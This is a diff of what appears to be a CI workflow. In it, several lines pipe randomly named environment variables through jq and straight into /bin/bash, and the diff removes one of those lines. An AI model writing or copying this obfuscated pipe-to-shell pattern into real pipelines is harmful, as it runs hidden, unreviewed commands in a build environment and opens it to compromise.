@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$notya106" | jq -r .xqma7201 | /bin/bash
           printf '%s' "$gpuj577" | jq -r .vzwe84 | /bin/bash
           printf '%s' "$jnjf0522" | jq -r .yki6153 | /bin/bash
-          echo $m7 | jq -r .ztro7646 | /bin/bash
           echo $a8 | jq -r .xi461 | /bin/bash
 
       - name: Persist output
